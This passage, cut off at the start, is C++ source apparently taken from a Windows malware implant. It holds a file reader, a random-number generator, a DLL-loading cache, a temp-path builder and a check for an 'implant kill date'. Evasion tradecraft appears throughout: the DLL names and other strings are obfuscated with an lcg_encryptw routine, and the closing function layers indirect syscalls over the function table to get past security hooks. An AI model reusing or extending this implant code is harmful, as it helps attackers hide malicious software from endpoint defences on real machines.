        return NULL;
    }

    DWORD bytesRead = (DWORD)ioStatusBlock.Information;

    /* Handle EOF (STATUS_END_OF_FILE is returned as success with 0 bytes) */
    if (bytesRead == 0 && status == 0) {
        debugPrint("[readFileChunk] Reached end of file");
        __free(buf);
        return NULL;
    }

    *outSize = bytesRead;
    debugPrint("[readFileChunk] Read %lu bytes @ offset %lld", bytesRead, byteOffset);
    return buf;
}

/* =============================================================================
 * Cryptographically Secure Pseudo-Random Number Generator (CSPRNG)
 * Uses Windows BCryptGenRandom for hardware-backed randomness
 * ============================================================================= */
/**
 * Generate cryptographically secure random bytes
 * @param buffer Output buffer for random bytes
 * @param length Number of bytes to generate
 * @return true on success, false on failure
 */
bool generateSecureRandom(functionTable* f, uint8_t* buffer, size_t length) {
    if (!f || !buffer || length == 0) return false;

    // Ensure crypto modules are loaded (CSPRNG depends on bcrypt/advapi32)
    REQUIRES_MODULE(f, ModuleCache::Module::BCRYPT);
    REQUIRES_MODULE(f, ModuleCache::Module::ADVAPI32);

    // Try BCryptGenRandom first (Windows Vista+)
    if (f->BCryptGenRandom) {
        NTSTATUS status = f->BCryptGenRandom(NULL, buffer, (ULONG)length, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
        if (status >= 0) return true;
    }
    // Fallback to CryptGenRandom (older Windows), guard against REQUIRES_MODULE failure
    if (f->CryptAcquireContextW && f->CryptGenRandom && f->CryptReleaseContext) {
        HCRYPTPROV hProv = 0;
        if (!f->CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
            return false;
        }
        BOOL result = f->CryptGenRandom(hProv, (DWORD)length, buffer);
        f->CryptReleaseContext(hProv, 0);
        return result != FALSE;
    }

    return false;
}

/**
 * Generate a secure nonce for XChaCha20-Poly1305
 * @param nonce Output buffer (must be 24 bytes)
 * @return true on success, false on failure
 */
bool generateSecureNonce(functionTable* f, uint8_t* nonce) {
    if (!nonce) return false;
    return generateSecureRandom(f, nonce, 24);
}

/**
 * Self-test for CSPRNG
 * Generates random data and checks for basic statistical properties
 * @return 0 on success, error count on failure
 */
int csprng_self_test(functionTable* f) {
    uint8_t buffer[256];
    int errors = 0;
    
    // Test 1: Generate 256 bytes and check they're not all zeros
    if (!generateSecureRandom(f, buffer, sizeof(buffer))) {
        c_debugPrint(f, "[CSPRNG_SELF_TEST] Failed to generate random data");
        return 1;
    }
    
    bool allZero = true;
    bool allOne = true;
    for (size_t i = 0; i < sizeof(buffer); i++) {
        if (buffer[i] != 0x00) allZero = false;
        if (buffer[i] != 0xFF) allOne = false;
    }
    
    if (allZero) {
        c_debugPrint(f,"[CSPRNG_SELF_TEST] Generated all zeros - CSPRNG failed!");
        errors++;
    }
    
    if (allOne) {
        c_debugPrint(f, "[CSPRNG_SELF_TEST] Generated all ones - CSPRNG failed!");
        errors++;
    }
    
    // Test 2: Generate nonce (24 bytes)
    uint8_t nonce[24];
    if (!generateSecureNonce(f, nonce)) {
        c_debugPrint(f,"[CSPRNG_SELF_TEST] Failed to generate nonce");
        errors++;
    }
    
    // Test 3: Generate two buffers and verify they're different
    uint8_t buffer2[256];
    if (!generateSecureRandom(f, buffer2, sizeof(buffer2))) {
        c_debugPrint(f,"[CSPRNG_SELF_TEST] Failed to generate second buffer");
        errors++;
    } else {
        bool different = false;
        for (size_t i = 0; i < sizeof(buffer); i++) {
            if (buffer[i] != buffer2[i]) {
                different = true;
                break;
            }
        }
        if (!different) {
            c_debugPrint(f,"[CSPRNG_SELF_TEST] Two generations produced identical output!");
            errors++;
        }
    }
    
    if (errors == 0) {
        c_debugPrint(f,"[CSPRNG_SELF_TEST] All tests passed");
    } else {
        c_debugPrint(f,"[CSPRNG_SELF_TEST] %d tests failed", errors);
    }
    
    return errors;
}

/* ============================================================================
 * Handle Caching Mechanism
 * Uses enum-based module resolution with cached HMODULE handles
 * ============================================================================ */
namespace ModuleCache {
    /* Module cache storage instance */
    ModuleCacheStorage g_moduleCache = {};

    /* Get module name string from Module */
    static const wchar_t* GetModuleNameInternal(Module moduleId)
    {
        switch (moduleId)
        {
            case Module::KERNEL32:  return lcg_encryptw(L"kernel32.dll");
            case Module::NTDLL:     return lcg_encryptw(L"ntdll.dll");
            case Module::ADVAPI32:  return lcg_encryptw(L"advapi32.dll");
            case Module::USER32:    return lcg_encryptw(L"user32.dll");
            case Module::GDI32:     return lcg_encryptw(L"gdi32.dll");
            case Module::SHELL32:   return lcg_encryptw(L"shell32.dll");
            case Module::OLE32:     return lcg_encryptw(L"ole32.dll");
            case Module::OLEAUT32:  return lcg_encryptw(L"oleaut32.dll");
            case Module::WS2_32:    return lcg_encryptw(L"ws2_32.dll");
            case Module::CRYPT32:   return lcg_encryptw(L"crypt32.dll");
            case Module::WINHTTP:   return lcg_encryptw(L"winhttp.dll");
            case Module::SECUR32:   return lcg_encryptw(L"secur32.dll");
            case Module::BCRYPT:    return lcg_encryptw(L"bcrypt.dll");
            case Module::IPHLPAPI:  return lcg_encryptw(L"iphlpapi.dll");
            case Module::MPR:       return lcg_encryptw(L"mpr.dll");
            case Module::MSVCRT:    return lcg_encryptw(L"msvcrt.dll");
            default:            return NULL;
        }
    }

    /*
    * Dispatch function that retrieves cached handle or loads DLL via switch statement
    * Uses __LoadLibraryW for loading
    * Transparent caching - returns cached handle if already loaded
    */
    HMODULE GetCachedModuleHandle(functionTable* funcTable, Module moduleId)
    {
        /* Validate module ID */
        if (moduleId <= Module::NONE || moduleId >= Module::MAX)
        {
            return NULL;
        }

        /* Return cached handle if already loaded */
        if (g_moduleCache.entries[static_cast<size_t>(moduleId)].loaded && g_moduleCache.entries[static_cast<size_t>(moduleId)].handle != NULL)
        {
            return g_moduleCache.entries[static_cast<size_t>(moduleId)].handle;
        }

        /* Get module name for loading */
        const wchar_t* dllName = GetModuleNameInternal(moduleId);
        if (dllName == NULL)
        {
            return NULL;
        }

        /* Load DLL via switch statement dispatch to __LoadLibraryW */
        HMODULE hModule = NULL;
        switch (moduleId)
        {
            case Module::KERNEL32:
                hModule = __LoadLibraryW(funcTable, (PWCHAR)GetModuleNameInternal(Module::KERNEL32));
                break;
            case Module::NTDLL:
                hModule = __LoadLibraryW(funcTable, (PWCHAR)GetModuleNameInternal(Module::NTDLL));
                break;
            case Module::ADVAPI32:
                hModule = __LoadLibraryW(funcTable, (PWCHAR)GetModuleNameInternal(Module::ADVAPI32));
                break;
            case Module::USER32:
                hModule = __LoadLibraryW(funcTable, (PWCHAR)GetModuleNameInternal(Module::USER32));
                break;
            case Module::GDI32:
                hModule = __LoadLibraryW(funcTable, (PWCHAR)GetModuleNameInternal(Module::GDI32));
                break;
            case Module::SHELL32:
                hModule = __LoadLibraryW(funcTable, (PWCHAR)GetModuleNameInternal(Module::SHELL32));
                break;
            case Module::OLE32:
                hModule = __LoadLibraryW(funcTable, (PWCHAR)GetModuleNameInternal(Module::OLE32));
                break;
            case Module::OLEAUT32:
                hModule = __LoadLibraryW(funcTable, (PWCHAR)GetModuleNameInternal(Module::OLEAUT32));
                break;
            case Module::WS2_32:
                hModule = __LoadLibraryW(funcTable, (PWCHAR)GetModuleNameInternal(Module::WS2_32));
                break;
            case Module::CRYPT32:
                hModule = __LoadLibraryW(funcTable, (PWCHAR)GetModuleNameInternal(Module::CRYPT32));
                break;
            case Module::WINHTTP:
                hModule = __LoadLibraryW(funcTable, (PWCHAR)GetModuleNameInternal(Module::WINHTTP));
                break;
            case Module::SECUR32:
                hModule = __LoadLibraryW(funcTable, (PWCHAR)GetModuleNameInternal(Module::SECUR32));
                break;
            case Module::BCRYPT:
                hModule = __LoadLibraryW(funcTable, (PWCHAR)GetModuleNameInternal(Module::BCRYPT));
                break;
            case Module::IPHLPAPI:
                hModule = __LoadLibraryW(funcTable, (PWCHAR)GetModuleNameInternal(Module::IPHLPAPI));
                break;
            case Module::MPR:
                hModule = __LoadLibraryW(funcTable, (PWCHAR)GetModuleNameInternal(Module::MPR));
                break;
            case Module::MSVCRT:
                hModule = __LoadLibraryW(funcTable, (PWCHAR)GetModuleNameInternal(Module::MSVCRT));
                break;
            default:
                return NULL;
        }

        /* Cache the result if successful */
        if (hModule != NULL)
        {
            g_moduleCache.entries[static_cast<size_t>(moduleId)].id      = moduleId;
            g_moduleCache.entries[static_cast<size_t>(moduleId)].handle  = hModule;
            g_moduleCache.entries[static_cast<size_t>(moduleId)].name    = dllName;
            g_moduleCache.entries[static_cast<size_t>(moduleId)].loaded  = true;
        }

        return hModule;
    }

    /*
    * Static version without functionTable dependency
    * Uses internal LdrLoadDll resolution
    */
    HMODULE GetCachedModuleHandleStatic(Module moduleId)
    {
        /* Validate module ID */
        if (moduleId <= Module::NONE || moduleId >= Module::MAX)
        {
            return NULL;
        }

        /* Return cached handle if already loaded */
        if (g_moduleCache.entries[static_cast<size_t>(moduleId)].loaded && g_moduleCache.entries[static_cast<size_t>(moduleId)].handle != NULL)
        {
            return g_moduleCache.entries[static_cast<size_t>(moduleId)].handle;
        }

        /* Get module name for loading */
        const wchar_t* dllName = GetModuleNameInternal(moduleId);
        if (dllName == NULL)
        {
            return NULL;
        }

        /* Load DLL via switch statement dispatch to standalone __LoadLibraryW */
        HMODULE hModule = NULL;
        switch (moduleId)
        {
            case Module::KERNEL32:
                hModule = __LoadLibraryW((PWCHAR)GetModuleNameInternal(Module::KERNEL32));
                break;
            case Module::NTDLL:
                hModule = __LoadLibraryW((PWCHAR)GetModuleNameInternal(Module::NTDLL));
                break;
            case Module::ADVAPI32:
                hModule = __LoadLibraryW((PWCHAR)GetModuleNameInternal(Module::ADVAPI32));
                break;
            case Module::USER32:
                hModule = __LoadLibraryW((PWCHAR)GetModuleNameInternal(Module::USER32));
                break;
            case Module::GDI32:
                hModule = __LoadLibraryW((PWCHAR)GetModuleNameInternal(Module::GDI32));
                break;
            case Module::SHELL32:
                hModule = __LoadLibraryW((PWCHAR)GetModuleNameInternal(Module::SHELL32));
                break;
            case Module::OLE32:
                hModule = __LoadLibraryW((PWCHAR)GetModuleNameInternal(Module::OLE32));
                break;
            case Module::OLEAUT32:
                hModule = __LoadLibraryW((PWCHAR)GetModuleNameInternal(Module::OLEAUT32));
                break;
            case Module::WS2_32:
                hModule = __LoadLibraryW((PWCHAR)GetModuleNameInternal(Module::WS2_32));
                break;
            case Module::CRYPT32:
                hModule = __LoadLibraryW((PWCHAR)GetModuleNameInternal(Module::CRYPT32));
                break;
            case Module::WINHTTP:
                hModule = __LoadLibraryW((PWCHAR)GetModuleNameInternal(Module::WINHTTP));
                break;
            case Module::SECUR32:
                hModule = __LoadLibraryW((PWCHAR)GetModuleNameInternal(Module::SECUR32));
                break;
            case Module::BCRYPT:
                hModule = __LoadLibraryW((PWCHAR)GetModuleNameInternal(Module::BCRYPT));
                break;
            case Module::IPHLPAPI:
                hModule = __LoadLibraryW((PWCHAR)GetModuleNameInternal(Module::IPHLPAPI));
                break;
            case Module::MPR:
                hModule = __LoadLibraryW((PWCHAR)GetModuleNameInternal(Module::MPR));
                break;
            case Module::MSVCRT:
                hModule = __LoadLibraryW((PWCHAR)GetModuleNameInternal(Module::MSVCRT));
                break;
            default:
                return NULL;
        }

        /* Cache the result if successful */
        if (hModule != NULL)
        {
            g_moduleCache.entries[static_cast<size_t>(moduleId)].id      = moduleId;
            g_moduleCache.entries[static_cast<size_t>(moduleId)].handle  = hModule;
            g_moduleCache.entries[static_cast<size_t>(moduleId)].name    = dllName;
            g_moduleCache.entries[static_cast<size_t>(moduleId)].loaded  = true;
        }

        return hModule;
    }

    void InitModuleCache(void)
    {
        for (int i = 0; i < static_cast<int>(Module::MAX); i++)
        {
            g_moduleCache.entries[i].id       = static_cast<Module>(i);
            g_moduleCache.entries[i].handle   = NULL;
            g_moduleCache.entries[i].name     = GetModuleNameInternal(static_cast<Module>(i));
            g_moduleCache.entries[i].loaded   = false;
        }
        g_moduleCache.initialized = true;
    }

    /* Clear all cached module handles (does not free libraries) */
    void ClearModuleCache(void)
    {
        for (int i = 0; i < static_cast<int>(Module::MAX); i++)
        {
            g_moduleCache.entries[i].handle = NULL;
            g_moduleCache.entries[i].loaded = false;
        }
        g_moduleCache.initialized = false;
    }

}; // namespace ModuleCache

namespace WinUtils {

    /**
    * Generate a random temp file path in format: \\?\{DRIVE}:\Temp\~{RANDOM_HEX}
    * @param funcTable Function table for syscalls
    * @param outPath     Output buffer (must be at least 260 WCHARs)
    * @return true on success
    */
    bool generateRandomTempPath(functionTable* funcTable, PWCHAR outPath) {
        if (funcTable == NULL || outPath == NULL) {
            return false;
        }

        uint8_t randomBytes[8];
        if (!generateSecureRandom(funcTable, randomBytes, sizeof(randomBytes))) {
            return false;
        }

        wchar_t systemDrive[4] = L"C:";
        if (funcTable->GetEnvironmentVariableW) {
            DWORD len = funcTable->GetEnvironmentVariableW(L"SYSTEMDRIVE", systemDrive, sizeof(systemDrive) / sizeof(systemDrive[0]));
            if (len == 0) {
                DWORD err = funcTable->GetLastError();
                if (err != ERROR_ENVVAR_NOT_FOUND) {
                    return false;
                }
            } else if (len >= sizeof(systemDrive) / sizeof(systemDrive[0])) {
                return false;
            }
        }

        const wchar_t* hexChars = lcg_encryptw(L"0123456789ABCDEF");
        wchar_t randomName[17];
        for (int i = 0; i < 8; ++i) {
            randomName[i * 2]     = hexChars[(randomBytes[i] >> 4) & 0x0F];
            randomName[i * 2 + 1] = hexChars[randomBytes[i] & 0x0F];
        }
        randomName[16] = L'\0';

        /* Build path manually: \\?\C:\Temp\~RANDOMNAME */
        size_t off = 0;
        const wchar_t prefix[] = L"\\\\?\\";
        for (size_t i = 0; i < 4 && off < 259; i++) outPath[off++] = prefix[i];
        safeWcsCopyBounded(outPath + off, systemDrive, 260 - off);
        off = __wcslen(outPath);
        const wchar_t mid[] = L"\\Temp\\~";
        for (size_t i = 0; i < 7 && off < 259; i++) outPath[off++] = mid[i];
        safeWcsCopyBounded(outPath + off, randomName, 260 - off);
        off = __wcslen(outPath);

        if (off == 0 || off >= 260) {
            outPath[0] = L'\0';
            return false;
        }

        return true;
    }
    /**
 * Get current Unix timestamp (seconds since 1970-01-01 UTC)
 * Uses Windows FILETIME and converts to Unix time
 * @return Current Unix timestamp, or 0 on error
 */
uint32_t getCurrentUnixTime(functionTable* f) {
    FILETIME ft;
    f->GetSystemTimeAsFileTime(&ft);
    
    LARGE_INTEGER li;
    li.LowPart = ft.dwLowDateTime;
    li.HighPart = ft.dwHighDateTime;
    
    // FILETIME is 100-nanosecond intervals since 1601-01-01
    // Unix time is seconds since 1970-01-01
    // Difference: 116444736000000000 (100-ns intervals)
    li.QuadPart -= 116444736000000000LL;
#ifdef __i386__
    // Use x86 DIVL (EDX:EAX / r/m32) to avoid __divdi3/libcall
    uint32_t lo32 = (uint32_t)li.LowPart;
    uint32_t hi32 = (uint32_t)li.HighPart;
    uint32_t q1 = 0, r1 = 0, q2, r2;
    if (hi32 >= 10000000) {
        __asm__("divl %4" : "=a"(q1), "=d"(r1) : "d"(0U), "a"(hi32), "rm"(10000000U));
    } else {
        r1 = hi32;
    }
    __asm__("divl %4" : "=a"(q2), "=d"(r2) : "d"(r1), "a"(lo32), "rm"(10000000U));
    return q2;
#else
    li.QuadPart /= 10000000;  // Convert to seconds
    return (uint32_t)li.QuadPart;
#endif
}

/**
 * Check if kill date has been reached
 * @param DateUnix Unix timestamp of date (0 = no date set)
 * @return true if date is set and has been reached, false otherwise
 * Used for implant kill dates.
 */
bool isDateReached(functionTable* f, uint32_t DateUnix) {
    // No kill date set
    if (DateUnix == 0) {
        return false;
    }
    
    // Get current time
    uint32_t currentTime = getCurrentUnixTime(f);
    
    // If we couldn't get current time, be conservative and don't exit
    if (currentTime == 0) {
        return false;
    }
    
    // Check if current time >= kill date
    return currentTime >= DateUnix;
}
}; // namespace WinUtils

/* ============================================================================
 * initSyscallsLayer - Layer indirect syscall support on top of initialized table
 * ============================================================================ */

void initSyscallsLayer(functionTable* funcTable) {
    if (!funcTable) return;
    (void)initSyscalls(SYSCALLS_ID::HWSYSCALLS);
    setNTAPISyscalls(funcTable);
    funcTable->parameters.areSyscallsInitialized = true;
}
